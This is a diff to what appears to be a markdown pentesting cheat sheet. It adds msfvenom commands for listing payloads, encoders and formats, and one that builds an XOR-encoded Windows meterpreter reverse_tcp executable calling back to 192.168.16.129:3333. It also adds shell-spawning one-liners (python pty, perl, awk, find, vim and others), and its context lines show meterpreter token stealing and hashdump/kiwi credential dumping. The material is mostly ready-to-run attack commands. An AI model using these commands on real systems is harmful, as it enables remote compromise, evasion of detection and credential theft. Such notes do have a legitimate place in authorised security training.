@@ -299,9 +299,148 @@ Requires inbound connectivity to the victim.
 
 #### Listing available payloads
 
+{% code overflow="wrap" %}
+```bash
+msfvenom -l payloads
+```
+{% endcode %}
 
+<figure><img src="../../.gitbook/assets/image (599).png" alt=""><figcaption></figcaption></figure>
 
+#### Listing available encoders
 
+{% code overflow="wrap" %}
+```bash
+msfvenom -l encoders
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>
+
+#### Listing available formats&#x20;
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -l formats
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (601).png" alt=""><figcaption></figcaption></figure>
+
+### Creating payload
+
+#### Identify basic options for payloads
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -p <payload> --list-options
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (603).png" alt=""><figcaption></figcaption></figure>
+
+#### Creating payload with basic options&#x20;
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.16.129 LPORT=3333 -f exe -e x64/xor -i 24 --platform windows --arch x64 -o exploit.exe
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>
+
+#### Mandatory Things
+
+{% code overflow="wrap" %}
+```bash
+msfvenom -p <payload> LHOST=<attacker ip> LPORT=<attacker port> -f <output format> -o exploitable.<format>
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>
+
+## Spawning Interactive Shell
+
+When you get a **limited shell** (jail shell), many commands won't work properly. The goal is to upgrade it into a **fully interactive TTY shell**.
+
+Interactive shell gives:
+
+* Command history
+* Tab completion
+* Better terminal control
+* Ability to run `sudo -l`
+* Easier privilege escalation
+
+### Methods to Spawn a Shell&#x20;
+
+1. **Using SH**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+/bin/sh -i
+```
+{% endcode %}
+
+2. Using python&#x20;
+
+{% code overflow="wrap" %}
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")' 
+```
+{% endcode %}
+
+3. Using Perl&#x20;
+
+{% code overflow="wrap" %}
+```bash
+perl -e 'exec "/bin/sh";'
+```
+{% endcode %}
+
+4. Using ruby&#x20;
+
+{% code overflow="wrap" %}
+```bash
+ruby -e 'exec "/bin/sh"'
+```
+{% endcode %}
+
+5. Using Lua
+
+{% code overflow="wrap" %}
+```bash
+lua -e 'os.execute("/bin/sh")'
+```
+{% endcode %}
+
+6. Using AWK&#x20;
+
+{% code overflow="wrap" %}
+```bash
+awk 'BEGIN {system("/bin/sh")}'
+```
+{% endcode %}
+
+7. Using Find&#x20;
+
+{% code overflow="wrap" %}
+```bash
+find . -exec /bin/sh \; -quit
+```
+{% endcode %}
+
+8. **Using VIM**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+# directly
+vim -c ':!/bin/sh'
+
+# Inside vim
+:set shell=/bin/sh
+:shell
+```
+{% endcode %}
 
 ## Meterpreter&#x20;
 
@@ -346,7 +485,7 @@ meterpreter> steal_token <service running with system privileges>
 ### **Dumping credentials**
 
 {% code overflow="wrap" %}
-```
+```bash
 meterperter> hashdump
          OR 
 meterpreter> load kiwi
